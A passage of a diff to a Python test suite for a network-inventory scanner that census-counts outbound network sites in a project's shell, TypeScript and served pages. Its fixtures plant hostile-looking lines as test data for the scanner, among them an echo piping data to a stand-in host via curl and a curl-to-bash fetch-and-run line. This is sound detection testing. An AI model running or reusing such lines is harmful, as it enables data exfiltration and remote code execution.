@@ -21,8 +21,10 @@ is the path of nested defs and classes (the worker is `_refresh_remote_prices.wo
 
 Text only: kernel/kernel.py is read as a file and parsed once per process (tests/parse_cache.py's source_and_tree: the
 parse this half, the switch case and the served pass below share, and in a serial cell the thread-stop census's parse of
-the same file is the same object); nothing loads romp code. The state root the preamble at the head mints is the state
-ratchet's floor for the in-process load of the census script (tests/test_state_isolation_order.py reads every importlib
+the same file is the same object); nothing loads romp code but tests/romp_load.py, imported above the preamble as every test
+module imports it, which execs kernel/loadsource.py (the suite's file-path importer) and gives a direct run of this module the
+tests package's private temp root. The state root the preamble at the head mints is the state ratchet's floor for the in-process
+load of the census script (tests/test_state_isolation_order.py reads every importlib
 load in a test module as a load of romp code), an empty directory under the run's temp root. tests/test_price_feed_off.py
 executes the switch at the one site this module counts (OffSwitch, GuardRoad); tests/test_stage_marks.py's census keys on
 the worker's inner def name.
@@ -44,8 +46,13 @@ tests/parse_cache.py's derived, the script's scan, figures, problems, render_sit
 serving the listing road and the --table road from one scan), over a copy of the scanned scope with one mutation at a
 time (each red the round reproduced or named, now a pin), or with a class's row-less mutations planted together and read
 from one run (_SharedRun, whose docstring says why that loses nothing), over two tiny roots (no sites; a missing root),
-and --table against the block the ledger entry carries between its two marker lines. The script loads no romp code and
-neither does this module; the copy lives under the run's temp root (tests/__init__.py's hook removes it, and
+and --table against the block the ledger entry carries between its two marker lines. Two child runs run the file as the
+command line runs it (_command_line; since the fifth round, when the review found the documented command held by no real
+run): over each tiny root, exiting 1 with the in-process run's output byte for byte, and over a copy whose kernel/kernel.py
+carries exactly the served pass's plants (written by _served_text, the text the pass parses), exiting 1 with the pass's
+output byte for byte, so the entry's exit code, the tree derivation and the served splice are each held against a real
+run. The script loads no romp code and
+this module loads none beyond tests/romp_load.py's kernel/loadsource.py; the copy lives under the run's temp root (tests/__init__.py's hook removes it, and
 tearDownModule does too).
 
 The third round of the review (2026-09-22) found the completeness claim holding for the Python half alone: the shell and
@@ -124,6 +131,7 @@ set, a clean summary) keeps its run, as does every mutation of the script and of
 carries the before and after figures and every touched pin's red.
 """
 import ast
+import bisect
 import contextlib
 import difflib
 import gc
@@ -133,14 +141,18 @@ import json
 import os
 import re
 import shutil
+import subprocess
 import sys
 import tempfile
 import unittest
+from romp_load import load_source   # noqa: F401  a direct run's floor (tests/romp_load.py), above the preamble as in every module
 
 # Hermetic state BEFORE the in-process load of the census script (script_module, below): tests/test_state_isolation_order.py
 # reads every importlib load in a test module as a load of romp code and asks for this floor above it. The script is
-# standard-library code and resolves no state root, and nothing here loads romp code; the floor is the ratchet's price for
-# the load, an empty directory under the run's temp root.
+# standard-library code and resolves no state root, and nothing here loads romp code but the suite's file-path importer
+# (tests/romp_load.py, imported above as every test module imports it, which execs kernel/loadsource.py); the floor is the
+# ratchet's price for the load, an empty directory under the run's temp root, which a direct run of this module has too
+# since the import above brings in the tests package.
 os.environ["XDG_STATE_HOME"] = tempfile.mkdtemp()
 os.environ.pop("ROMP_STATE_DIR", None)   # a live kernel's export outranks the XDG floor
 
@@ -398,10 +410,12 @@ def script_module(root):
     derivation, the served pass and the binding read share it), a copy's once per text on disk, since a case mutates the
     copy's script (M19 to M26, the stale row, the roads set, the openExternal entry, the rowed interpreter text) and its
     cleanup restores it, and each text is its own module. The name is private and never enters sys.modules, so the script's
-    `if __name__ == "__main__"` road does not run. The module carries the script's constants (T, ROADS, CLASS_ROWS,
-    CLICK_RESIDUAL, EXPECTED) and its functions (main, scan, figures, problems, render_sites, render_table, Scan,
-    served_texts, Result, Site), the surface the runs and the served pass call. The fifth round (2026-09-23), on the
-    reviewer's cost ruling; a child interpreter ran the file before it."""
+    `if __name__ == "__main__"` road does not run here; the two child runs of the file (_command_line) run it. The module
+    carries the script's constants (T, ROADS, CLASS_ROWS, CLICK_RESIDUAL, PAINT_LIST, PAINT_CLAUSE, SERVED_ALLOW, EXPECTED)
+    and its functions (main, scan, figures, problems, render_sites, render_table, Scan, served_texts, Result, Site), the
+    surface the runs, the served pass, the stale-entry cases and the binding reads call (this module's and
+    tests/test_security_price_feed.py's, which read CLASS_ROWS, CLICK_RESIDUAL, ROADS and the paint constants here and in no
+    child). The fifth round (2026-09-23), on the reviewer's cost ruling; a child interpreter ran the file before it."""
     real = os.path.realpath(os.path.join(root, INVENTORY))
     st = os.stat(real)
     key = (real, (st.st_size, st.st_mtime_ns, st.st_ino, st.st_ctime_ns))
@@ -418,12 +432,24 @@ def inventory(root, *flags):
     """Run <root>/scripts/network-inventory.py over root in this process: the script's own main (script_module), the flags
     and the root as the command line hands them, stdout and stderr captured, the collector held off for the run
     (_collector_off): (exit code, stdout, stderr), the exit code being main's return, which the command line passes to
-    sys.exit. One run is one full scan of the root's declared scope, about 2.4 s on 3.10 with the collector off."""
+    sys.exit (that entry is held by the two child runs of the file, _command_line). One run is one full scan of the root's
+    declared scope, about 2.4 s on 3.10 with the collector off."""
     mod = script_module(root)
     out, err = io.StringIO(), io.StringIO()
     with _collector_off(), contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
         rc = mod.main(list(flags) + [root])
     return rc, out.getvalue(), err.getvalue()
+
+
+def _command_line(root, timeout):
+    """(exit code, stdout bytes, stderr text) of `python3 <root>/scripts/network-inventory.py <root>` in a child: the file run as
+    SECURITY.md's Network access section documents the command, so its `if __name__ == "__main__"` entry runs, which no
+    in-process run reaches (script_module loads the file under a private name). Two cases of this module make it (the fifth
+    round of the review, 2026-09-23, found that the cost cut left the documented command held by no real run): the tiny roots'
+    case (about 0.05 s a child) and the served class's command-line case (one full scan). The child inherits this process's
+    environment, the state floor above included, and reads no state."""
+    p = subprocess.run([sys.executable, os.path.join(root, INVENTORY), root], capture_output=True, timeout=timeout)
+    return p.returncode, p.stdout, p.stderr.decode("utf-8", "replace")
 
 
 class _Run(object):
@@ -466,7 +492,8 @@ def tree_run(*flags):
     `python3 scripts/network-inventory.py [--table] ROOT` prints them, from the one derivation (_tree): with no flag the
     listing, the problem lines after it on stdout; with --table the table on stdout and the problem lines on stderr; the exit
     code 1 when there is any problem line, else 0 (main's own composition, read for the order; main itself runs in every
-    other run of this module, over the copy and the tiny roots). Two roads and no other flag."""
+    other run of this module, over the copy and the tiny roots, and the served class's command-line case holds this
+    composition to a run of the file, through the served pass, which starts from it). Two roads and no other flag."""
     if flags not in ((), ("--table",)):
         raise ValueError("tree_run takes no flag or --table alone, the two roads main renders: %r" % (flags,))
     run = _tree()
@@ -613,6 +640,20 @@ class _Scope(unittest.TestCase):
         got = summary(out)
         self.assertIsNotNone(got, "the summary line has the committed shape (the totals, the class counts, the files):\n" + gates(out))
         self.assertEqual(got["unclassified"], 0)
+
+    def assertCommandLine(self, root, rc, out, timeout):
+        """The file run as the command line runs it over root (_command_line) exits 1 and prints `out`, the in-process run's
+        stdout, byte for byte as UTF-8 (CI and the box run a UTF-8 locale; another locale fails here loudly), and `rc`, that
+        run's exit code, is 1 too: the documented exit code, which only a run of the file's own entry holds. A difference
+        names the first differing lines."""
+        code, got, err = _command_line(root, timeout)
+        self.assertEqual((rc, code), (1, 1), "the in-process run and the command line each exit 1 over %s (in process %r, command "
+                         "line %r; stderr: %s)" % (root, rc, code, err[-400:]))
+        if got != out.encode("utf-8"):
+            diff = list(difflib.unified_diff(out.splitlines(), got.decode("utf-8", "replace").splitlines(), "in process", "command line",
+                                             lineterm="", n=0))
+            self.fail("the command line's stdout over %s is not the in-process run's (%d bytes against the in-process %d):\n%s\n(stderr: %s)"
+                      % (root, len(got), len(out.encode("utf-8")), "\n".join(diff[:40]), err[-400:]))
 
     def assertListed(self, out, pattern, msg=""):
         """A site line matching the pattern is in the run's listing (the failure quotes the lines of that file, not the run)."""
@@ -765,6 +806,13 @@ class TheCensusRunsFromTheSuite(_SharedRun):
         self.assertEqual(after, before, "the counts file is untouched by a refused write")
 
     def test_no_sites_and_a_missing_root_are_each_refused_by_name(self):
+        """Two tiny roots (no sites; the kernel root missing), each run in this process (inventory) and as the command line runs
+        the file (_command_line; the fifth round of the review found the documented command held by no real run, fresh-1):
+        exit 1 from both and the same stdout, byte for byte. The child is a run of the file's own entry,
+        `sys.exit(main(sys.argv[1:]))` under `if __name__ == "__main__"`, which every in-process run skips, so a lost sys.exit,
+        a deleted block or an entry that drops main's return code exits 0 here (M32 to M34), at about 0.05 s a child. No child
+        runs over a clean tree for exit 0: an entry that always exits non-zero fails the documented command on every tree,
+        which is loud. The served class's command-line case holds the full scan."""
         for missing in (None, "kernel"):
             tiny = tempfile.mkdtemp(prefix="census-tiny-")
             for d in SCOPE_DIRS:
@@ -778,6 +826,7 @@ class TheCensusRunsFromTheSuite(_SharedRun):
                 self.assertIn("SCOPE the declared root kernel/ is missing", gates(out))
             else:
                 self.assertNotIn("declared root", gates(out))
+            self.assertCommandLine(tiny, rc, out, timeout=60)
 
 
 class TheWalkIsRecursiveOverTheDeclaredScope(_SharedRun):
@@ -1013,20 +1062,39 @@ ECHO_RULE = ("An echo- or print-led shell line is skipped as a printed remedy on
              "outside quotes and the body of every `$(...)` and backtick substitution, wherever it stands, are scanned by the interpreter arm "
              "and the tool list, so `echo \"$body\" | curl ...` and `echo \"rate: $(curl ...)\"` are sites and a remedy that names a tool "
              "inside quotes is not.")
-SERVED_PAGES = ("The pages the kernel serves and its service worker's script, from its own string constants (the dashboard shell, the seven "
-                "pane pages, the token login page, the too-large page and /sw.js, with the shim, the timeline boot and the shell scripts they "
-                "inline), are read from kernel.py's syntax tree, each route's page function followed to the constants it returns or inlines, "
-                "and scanned as browser text keyed kernel/kernel.py plus tool, with the DOM loads counted; a route that serves text/html or "
-                "text/javascript from text the extraction cannot read fails the run (SERVED); a file the page reads at run time is covered "
-                "by the walk when it is a scanned kind, and a stylesheet is named, not scanned.")
+SERVED_PAGES = ("The pages the kernel serves and its service worker's script, from its own string constants (the dashboard shell, the seven pane "
+                "pages, the token login page, the too-large page and /sw.js, with the shim, the timeline boot and the shell scripts they inline), "
+                "are read from kernel.py's syntax tree and scanned as browser text keyed kernel/kernel.py plus tool, with the DOM loads counted. "
+                "The routes are derived from every `_send` call and every Content-Type header written outside `_send`, in every scanned Python "
+                "file. A `_send` call's content type is read through the definition it reaches: the kernel's Handler._send writes its `ctype` "
+                "parameter, so the call's third argument or its `ctype=` keyword; the postal bus's writes application/json; the session host's and "
+                "its transport's write a frame to a Unix socket and answer no HTTP request (FRAME_WRITERS), and any other definition that writes no "
+                "Content-Type fails the run. The type is read through module constants, through a local whose every binding is read and through a "
+                "dict literal's values; the part before any `;`, stripped and lower-cased, is compared with the types a browser runs script from "
+                "(SCRIPT_TYPES: text/html; the XML types text/xml, application/xml, text/xsl and any type with a `+xml` suffix, image/svg+xml and "
+                "application/xhtml+xml among them; and text/javascript under each name a browser takes for JavaScript, application/javascript among "
+                "them). The page function of each script-running route is followed to the text it returns or inlines. In that text the served pass "
+                "reads a BoolOp's operands, a method call's receiver and a subscript's container when they name a module constant or a local, the "
+                "receiver of `.encode` or `.format_map` whatever it is, a class attribute the class body binds, a loop, unpacking or with target "
+                "from its source, and a local container's appended or stored values; it passes over a base that carries no page text (an import, a "
+                "builtin, a parameter, an except name, or a name the function binds from one of those). The run fails by name (SERVED) on a content "
+                "type the pass cannot read, a script-running type written outside `_send`, a function that answers outside `_send` more often than "
+                "it writes a Content-Type header, a container the module writes at run time, any other receiver or container, and a route whose "
+                "text the pass cannot read, unless the served allowlist, SERVED_ALLOW, names the place by its function and expression, with the "
+                "number of places the entry covers and the reason (the two answers with no body, the CORS preflight's 204 and the websocket "
+                "upgrade's 101, are named there); an entry that names nothing in the run, or covers a different number of places, fails the run "
+                "too. In served text every `fetch(` and `import(` on a line is read by its own argument, and no comment skip applies, since a "
+                "joined constant is one line whatever it starts with. A file the page reads at run time is covered by the walk when it is a scanned "
+                "kind, and a stylesheet is named, not scanned.")
 SERVED_REFUSED_SCAN = ("The whole of kernel.py is not scanned as text, since a text scan misreads Python and JS concatenations (a Python "
                        "method spelled like a client, a `from` inside a script split across Python literals).")
 SERVED_IMPORT_GATE = ("Over served text the import gate's statement form applies only to a line that starts with import or export (a line led "
                       "by a closing brace is a multi-line import's last line in a module and any block's in a page's script), while a literal "
                       "require() or import() is gated wherever it stands.")
-SERVED_KEYED_RESIDUAL = ("The served pages' rows are keyed by tool (kernel/kernel.py plus WebSocket, window.open or clients.openWindow), so a "
-                         "second socket or opener in the served text is caught by the count per key when it changes the tool and not when it "
-                         "keeps it, as any rowed shell or JavaScript line is (the residual above).")
+SERVED_KEYED_RESIDUAL = ("The served pages' rows are keyed by tool (kernel/kernel.py plus WebSocket, window.open or clients.openWindow) and counted "
+                         "once per line; only fetch and import() are read per match. A second socket or opener in the served text is therefore "
+                         "caught by the count per key when it changes the tool or stands on a line without its tool, and not when it joins a line "
+                         "or a joined constant that already carries its tool, as any rowed shell or JavaScript line is (the residual above).")
 SERVED_NAMED_CLASS = ("Named and not counted in the served text: a stylesheet's `url()` loads (THEME_CSS's fonts, _LOADER_CSS's face, "
                       "_RDRIFT_CSS's and the dashboard shell's own rules, and the pane stylesheets under ui/webview read at run time), every one "
                       "a `/media` path on the kernel's own origin, and the same-origin navigations no list names (`location.replace` on the token "
@@ -1035,6 +1103,34 @@ SERVED_NAMED_CLASS = ("Named and not counted in the served text: a stylesheet's 
 ROUND_FOUR_SENTENCES = (("the echo rule", ECHO_RULE), ("the served pages", SERVED_PAGES), ("the refused whole-file text scan", SERVED_REFUSED_SCAN),
                         ("the narrowed import gate over served text", SERVED_IMPORT_GATE), ("the keyed-by-tool residual of the served rows", SERVED_KEYED_RESIDUAL),
                         ("the named class the served scan does not count", SERVED_NAMED_CLASS))
+# The fifth round's sentences (2026-09-23), one text each with the script's docstring: the served scan's line-keying residual
+# (correctness-4), the two roads named in the table and not counted (extra6-1, the paint references of the chat's file preview
+# and a notice card; extra6-2, an .svg opened in its own tab), and the binding shapes no pattern reads (correctness-3), which
+# TheAddedBindingShapesAreRead's residual file witnesses at no site; SERVED_PAGES above is the fifth round's rewrite of the
+# fourth round's sentence (F, G and H), one text with SECURITY.md's (tests/test_security_price_feed.py holds that home)
+SERVED_LINE_RESIDUAL = ("A site in served text is listed at the first line of the string part that carries it. Text joined across implicitly "
+                        "concatenated literals is one part, listed at its first line. On Python 3.10 and 3.11 an f-string part is listed at the "
+                        "line where the expression before it ends, so a part that starts on a later line (after a `}` on a line of its own, or in "
+                        "the next literal of a concatenation) is listed early. The count is the same on every interpreter.")
+PAINT_ROAD_SENTENCE = ("One road is named in the table and not counted, since its loads are rendered-markdown insertions with no attribute line: "
+                       "the chat's file preview (render.ts previewMdClean) and a notice card's body (feed.ts noticeBodyNodes) render markdown "
+                       "through the shared sanitizer and then stripRemoteLoads (ui/webview/file-preview.ts), which reads no paint attribute, so an "
+                       "inline svg's paint references load from the hosts they name; tests/test_security_price_feed.py places every caller of "
+                       "stripRemoteLoads by grep, so a new surface on the strip is red by name.")
+SVG_TAB_ROAD_SENTENCE = ("A second road is named in the table and not counted, since its loads are the opened document's own and have no line in "
+                         "this tree: a Cmd, Ctrl or middle click on a path link to an .svg opens the kernel's /file URL, or its /remote/<host>/file "
+                         "relay, in the browser's own tab through preview.ts's openFileTab, a site counted on the local-kernel road by the URL it "
+                         "opens, and that tab is an svg document that loads what its markup names; tests/test_security_price_feed.py holds the "
+                         "road's population to the property that image/svg+xml is the one document type /file serves a file's bytes under, so a "
+                         "second document type there is red.")
+UNREAD_BINDINGS = ("Three binding shapes no pattern reads fall under that rule: a require assigned after its declaration (`let h; h = "
+                   "require(\"http\")`), a `.then()` callback parameter of `import()`, and a call through an alias of `require` (`const r = require; "
+                   "const h = r(\"http\")`); a call through any of them is no site and no line. The import gate reads the literal `require()` and "
+                   "`import()` of the first two, so in those shapes an `https`, `net` or `tls` module fails the run and the residual reaches "
+                   "`http`, `ws` and `child_process`, the packages the list knows; an aliased require spells no literal `require()`, so the gate "
+                   "does not read its module either, and that shape reaches every module.")
+ROUND_FIVE_SENTENCES = (("the served scan's line-keying residual", SERVED_LINE_RESIDUAL), ("the paint road named and not counted", PAINT_ROAD_SENTENCE),
+                        ("the .svg tab road named and not counted", SVG_TAB_ROAD_SENTENCE), ("the binding shapes no pattern reads", UNREAD_BINDINGS))
 
 
 def _inventory_docstring():
@@ -1344,8 +1440,27 @@ class TheResidualClassIsStatedAndHeld(_SharedRun):
         doc = _inventory_docstring()
         for name, sentence in ROUND_FOUR_SENTENCES:
             self.assertIn(sentence, doc, "the docstring states %s in the sentence the tests hold" % name)
-        self.assertEqual(doc[doc.index(DISCLOSURE) + len(DISCLOSURE):].lstrip()[:len(ECHO_RULE)], ECHO_RULE,
-                         "the echo rule is the sentence right after the disclosure sentence: the narrowing of the skip is stated where the closed lists are")
+        # since the fifth round the binding shapes no pattern reads (UNREAD_BINDINGS) stand between the two: the residual of the
+        # disclosure's rule, stated right after it, and then the echo rule
+        after = doc[doc.index(DISCLOSURE) + len(DISCLOSURE):].lstrip()
+        self.assertEqual(after[:len(UNREAD_BINDINGS)], UNREAD_BINDINGS, "the binding shapes no pattern reads are the sentence right after the "
+                         "disclosure sentence: the residual of the rule it states")
+        self.assertEqual(after[len(UNREAD_BINDINGS):].lstrip()[:len(ECHO_RULE)], ECHO_RULE,
+                         "the echo rule follows: the narrowing of the skip is stated where the closed lists are")
+
+    def test_the_fifth_rounds_sentences_stand_in_the_docstring(self):
+        """The fifth round of the review (2026-09-23): the served scan's line-keying residual (correctness-4, held by the served
+        pass's R plants), the two roads named in the table and not counted (the paint references of the chat's file preview and a
+        notice card, extra6-1, held by tests/test_security_price_feed.py's caller census and the browser witness; an .svg opened in
+        its own tab, extra6-2, held by that module's document-type case and the tab witness) and the binding shapes no pattern reads
+        (correctness-3, witnessed at no site by TheAddedBindingShapesAreRead): each in the docstring in the sentence the tests hold,
+        the table's two rows in TheTableIsTheLedgers."""
+        doc = _inventory_docstring()
+        for name, sentence in ROUND_FIVE_SENTENCES:
+            self.assertIn(sentence, doc, "the docstring states %s in the sentence the tests hold" % name)
+        self.assertLess(doc.index(RESIDUAL), doc.index(PAINT_ROAD_SENTENCE), "the paint road follows the fifth class it is named beside")
+        self.assertLess(doc.index(PAINT_ROAD_SENTENCE), doc.index(SVG_TAB_ROAD_SENTENCE), "the .svg tab road is the second road named and not counted")
+        self.assertLess(doc.index(SERVED_PAGES), doc.index(SERVED_LINE_RESIDUAL), "the line-keying residual follows the served sentence it qualifies")
 
 
 class TheHeadsFigureNamesASwappedProgram(_Scope):
@@ -1494,19 +1609,43 @@ class TheClickedLinkRoadIsPinned(_Scope):
         self.assertIn(CLICK_RESIDUAL, cells[2], "the same sentence, in the road's trigger cell")
         self.assertEqual(cells[4], "none; nothing sends until you click", "no switch: the click is the occasion")
 
+    def test_the_sent_cell_points_at_the_paint_reference_exception_and_no_longer_says_the_token_travels_only(self):
+        """extra6-4 of the fifth round: the clicked-link sent cell said the serve token travels only on the bundles' own URLs, false
+        in the same --table as the chat-media row's paint-reference clause; the words are withdrawn, and the cell now says what romp
+        adds to a link's URL and points at the paint reference's Referer with the paint clause's condition. The old words, and the
+        words of the parenthetical's first rewording, are held absent, the new present."""
+        rc, table, err = tree_run("--table")
+        self.assertEqual(rc, 0, err[-1500:])
+        row = next((r for r in table.splitlines() if r.startswith("| %s | " % CLICKED_LABEL)), None)
+        self.assertTrue(row, "the table has the road: %r" % CLICKED_LABEL)
+        cells = [c.strip() for c in row.strip().strip("|").split(" | ")]
+        self.assertNotIn(CLICKED_TRAVELS_ONLY_WITHDRAWN, cells[3], "the sent cell no longer claims the serve token travels only on the bundles' own "
+                         "URLs: a paint reference's Referer can carry it (the chat-media row in the same table)")
+        self.assertIn(CLICKED_NEW, cells[3], "the cell says what romp adds to a link's URL and points at the paint reference's Referer, "
+                      "conditioned as the paint clause conditions it")
+        for words in CLICKED_WITHDRAWN:
+            self.assertNotIn(words, cells[3], "the withdrawn words are absent from the sent cell: %r" % words)
+
 
 # ---- the fourth round of the review (2026-09-23) --------------------------------------------------------------------------
-# D1, the echo rule: seven echo-led lines appended to bin/romp in the shared shell run. The first four are live (a pipe outside the
-# quotes; a curl substitution inside them; a python3 -c and a node -e substitution), the last three are copies of the tree's
-# printed remedies (a tool inside quotes; an escaped quote and an escaped dollar; a substitution whose body names no tool).
+# D1, the echo rule: eleven echo-led lines appended to bin/romp in the shared shell run. The first eight are live (a pipe outside
+# the quotes; a curl substitution inside them; a python3 -c and a node -e substitution; and, since the fifth round (tests-1), one
+# line per arm of _live_remainder's walk: a backtick substitution inside the quotes, then a subshell paren, a quoted paren and a
+# backslash-escaped paren each standing in a body before its curl), the last three are copies of the tree's printed remedies (a
+# tool inside quotes; an escaped quote and an escaped dollar; a substitution whose body names no tool).
 ECHO_TEXT = ('echo "$body" | curl -fsSL -d @- https://TESTHOST/collect\n'
              'echo "rate: $(curl -fsSL https://TESTHOST/rate)"\n'
              'echo "$(python3 -c \'import urllib.request; urllib.request.urlopen("https://TESTHOST/x").read()\')"\n'
              'echo "$(node -e \'fetch("https://TESTHOST/x")\')"\n'
+             'echo "tick: `curl -fsSL https://TESTHOST/tick`"\n'
+             'echo "$( (cd /tmp) ; curl -fsSL https://TESTHOST/subshell)"\n'
+             'echo "$(printf \')\' ; curl -fsSL https://TESTHOST/quoted)"\n'
+             'echo "$(printf \\) ; curl -fsSL https://TESTHOST/escaped)"\n'
              'echo "  curl -fsSL https://TESTHOST/bootstrap.sh | bash"\n'
              'echo "    curl -fsSL <url> | ROMP_DIR=\\"\\$HOME/elsewhere\\" bash" >&2\n'
              'echo "      forward the port:  ssh -N -L $p:127.0.0.1:$p $(hostname -s 2>/dev/null || echo \'<this-host>\')"\n')
 ECHO_STARTS = (("pipe", 'echo "$body" |'), ("substitution", 'echo "rate: $('), ("python", 'echo "$(python3 -c'), ("node", 'echo "$(node -e'),
+               ("backtick", 'echo "tick: `'), ("subshell", 'echo "$( (cd'), ("quoted", 'echo "$(printf \')\''), ("escaped", 'echo "$(printf \\)'),
                ("remedy_pipe", 'echo "  curl'), ("remedy_escaped", 'echo "    curl'), ("remedy_ssh", 'echo "      forward'))
 # the tree's four printed remedies, located by content: the pipe or the substitution stands inside the quotes, so none is live
 REMEDY_LINES = (("bin/romp-uninstall", 'bootstrap.sh | bash"'), ("install.sh", 'bootstrap.sh | bash"'),
@@ -1524,6 +1663,37 @@ DEDUPE_TEXT = 'import * as http from "http";\n\nexport function probeDedupe(): v
 ARM_LINE = "        for tool in _net_sites(live, nb):   # the connection family through the file's bindings: a tool the literal list named on this line is counted once\n"
 ARM_OFF = "        for tool in []:\n"
 TIMELINE_CALL = "require('http').request("
+# D3, the added binding shapes (the fifth round of the review, correctness-3): one call line per shape the patterns gained, over http, ws and
+# child_process, the three modules KNOWN_JS_IMPORTS admits (an https, net or tls import in any shape is an IMPORT problem instead),
+# each line's tool the family's own; the file is new, so every line is the case's own
+SHAPES_TEXT = ('import Hm, { request as mixedRequest } from "http";\nimport Hn, * as Hns from "http";\nimport { default as Hd } from "http";\n'
+               'import Hq = require("http");\nimport WSd, { WebSocket as WSn } from "ws";\nimport cp, { spawn as cpSpawn } from "child_process";\n\n'
+               'export async function probeBindingShapes(u: string): Promise<void> {\n  const Ha = await import("http");\n'
+               '  const { request: awaitedRequest } = await import("http");\n  Hm.get("http://TESTHOST/x");\n'
+               '  mixedRequest({ host: "TESTHOST", port: 80, path: "/x" });\n  Hn.get("http://TESTHOST/x");\n'
+               '  Hns.request({ host: "TESTHOST", port: 80, path: "/x" });\n  Hd.get("http://TESTHOST/x");\n'
+               '  Hq.request({ host: "TESTHOST", port: 80, path: "/x" });\n  Ha.get("http://TESTHOST/x");\n'
+               '  awaitedRequest({ host: "TESTHOST", port: 80, path: "/x" });\n  const s = new WSd(u);\n  const t = new WSn(u);\n  void s; void t;\n'
+               '  cp.execFile("ls", ["-la"]);\n  cpSpawn("ls", ["-la"]);\n}\n')
+# shape -> (its call line in SHAPES_TEXT, the tool the site is keyed on)
+SHAPE_LINES = {"mixed default": (11, "http.get"), "mixed named member": (12, "http.request"), "default beside a namespace": (13, "http.get"),
+               "namespace beside a default": (14, "http.request"), "import { default as X }": (15, "http.get"), "import-equals": (16, "http.request"),
+               "await import() whole": (17, "http.get"), "await import() destructured": (18, "http.request"), "ws mixed default": (19, "WebSocket"),
+               "ws mixed named member": (20, "WebSocket"), "child_process mixed default": (22, "execFile"), "child_process mixed named member": (23, "spawn")}
+SHAPE_COUNTS = {"http.get": 4, "http.request": 4, "WebSocket": 2, "execFile": 1, "spawn": 1}   # the file's per-key counts, None committed
+# the shapes no pattern reads, the disclosed residual: a require assigned after its declaration, a .then() callback parameter and an
+# aliased require, over http, ws and child_process; the variables are not spelled as the modules, so the literal list is silent too
+UNREAD_TEXT = ('export function probeUnreadBindings(u: string): void {\n  let hh; hh = require("http");\n  hh.get("http://TESTHOST/x");\n'
+               '  import("http").then((hp) => hp.get("http://TESTHOST/x"));\n  const rq = require; const hr = rq("http");\n'
+               '  hr.get("http://TESTHOST/x");\n  let wl; wl = require("ws"); new wl(u);\n  import("ws").then((wp) => new wp.WebSocket(u));\n'
+               '  const wr = rq("ws"); new wr(u);\n  let cpl; cpl = require("child_process"); cpl.execFile("ls", ["-la"]);\n'
+               '  import("child_process").then((cpp) => cpp.spawn("ls", ["-la"]));\n  const cpr = rq("child_process"); cpr.execFile("ls", ["-la"]);\n}\n')
+# the residual's second half over the packages the list does not know: a late-assigned require and a .then() import of https spell
+# a literal require() or import(), which the import gate reads (IMPORT at lines 2 and 4); the aliased require spells none, so its
+# https is neither refused nor a site (lines 5 and 6), the split UNREAD_BINDINGS states
+UNREAD_HTTPS = ('export function probeUnreadHttps(u: string): void {\n  let hs; hs = require("https");\n  hs.get("https://TESTHOST/x");\n'
+                '  import("https").then((hp) => hp.get("https://TESTHOST/x"));\n  const rq = require; const hr = rq("https");\n'
+                '  hr.get("https://TESTHOST/x");\n}\n')
 # E, the served pages: the plants in kernel/kernel.py (each located by content in the copy after every plant has landed)
 BOOT_ANCHOR = "function post(m){api.postMessage(m);}\n"
 BOOT_PLANTS = ('fetch("https://example.invalid/probe");\n'
@@ -1551,14 +1721,49 @@ SERVED_COMPUTED = ("fetch(u,{cache", "fetch(path,{method:'POST',headers", "fetch
 PANE_CSS = re.compile(r'\(UI / "webview" / "([a-z]+-pane\.css)"\)\.read_text\(\)')
 # A, the chat-media road: the row's key line and the JS entry (with and without the lookbehind that keeps the definition out)
 CHAT_MEDIA_LABEL = "a rendered message's media (browser)"
-# The sent cell's clause on an inline svg's paint references (kept by the sanitizer, loading at render, their request able to carry the
-# dashboard's address with the serve token in its Referer), one text with SECURITY.md's sentence, which tests/test_security_price_feed.py
-# holds to the same words; the claim it replaces, that no token rides, is held absent
-CHAT_MEDIA_PAINT = ("an inline svg's paint references (a `fill`, `mask` or `filter` whose `url()` names another host) load at render too, with no "
-                    "click, and are the one case where the request can carry the dashboard's address with the serve token in its Referer: the browser does "
-                    "not reliably hold them to the page's referrer policy, so the request to that host can carry the page's origin or the full chat URL "
-                    "with the serve token (the response is blocked as cross-origin; the request, with that header, has reached the host)")
+SVG_TAB_LABEL = "an .svg opened in its own tab (browser)"   # the .svg tab road's row, named and not counted (extra6-2 of the fifth round)
+PAINT_ROW_LABEL = "an inline svg's paint references in the chat's file preview and a notice card (browser)"   # the paint road's row (extra6-1)
+# The paint clause, one text in every home (the fifth round of the review, D and E; apd's derivation with the round's rulings
+# applied): which of an inline svg's paint references load from another host in each engine, and what those requests carry, with the
+# token half conditioned on the page's own address carrying `?token=`. Fixed literals here, held equal to the script's table cell by
+# TheChatMediaRoadIsRowed and to SECURITY.md's clause by tests/test_security_price_feed.py, which imports these; the browser witness
+# ties SECURITY.md's own text to what the attributes do. PAINT_LIST, the first half, is the .svg tab row's list too.
+PAINT_LIST = ("in Chromium a `fill`, `stroke`, `clip-path`, `mask`, `marker-start`, `marker-mid` or `marker-end` whose `url()` names another host "
+              "loads from that host, in Firefox and WebKit at least a `mask` does, and a `filter` does in no engine")
+PAINT_CLAUSE = ("in Chromium a `fill`, `stroke`, `clip-path`, `mask`, `marker-start`, `marker-mid` or `marker-end` whose `url()` names another host "
+                "loads from that host, in Firefox and WebKit at least a `mask` does, and a `filter` does in no engine; each such request carries no "
+                "cookie and carries the page's origin (the dashboard's scheme, host and port) in its Origin header; in Chromium a `mask` request "
+                "can also carry that origin as its Referer, from any page, framed or bare; and a paint request can carry the full page address with "
+                "the serve token in its Referer, but only when the page's own address carries `?token=` (a pane page opened bare, such as "
+                "`/chat?token=`; the shell drops the token from its address before it frames its panes, and frames them without it); these paint "
+                "requests are the one exception to the trust model's sentence on `Referrer-Policy: same-origin` (the response is blocked as "
+                "cross-origin; the request, with those headers, has reached the host)")
+# The sent cell's clause on an inline svg's paint references (kept by the sanitizer, loading at render): one text with SECURITY.md's
+# sentence and the paint row's, which tests/test_security_price_feed.py holds to the same words; the claim it replaces, that no token
+# rides, is held absent, and PAINT_TOKEN_CONDITION is the token half's condition (fresh-2)
+CHAT_MEDIA_PAINT = ("an inline svg's paint references load at render too, with no click: in Chromium a `fill`, `stroke`, `clip-path`, `mask`, "
+                    "`marker-start`, `marker-mid` or `marker-end` whose `url()` names another host loads from that host, in Firefox and WebKit at "
+                    "least a `mask` does, and a `filter` does in no engine; each such request carries no cookie and carries the page's origin (the "
+                    "dashboard's scheme, host and port) in its Origin header; in Chromium a `mask` request can also carry that origin as its "
+                    "Referer, from any page, framed or bare; and a paint request can carry the full page address with the serve token in its "
+                    "Referer, but only when the page's own address carries `?token=` (a pane page opened bare, such as `/chat?token=`; the shell "
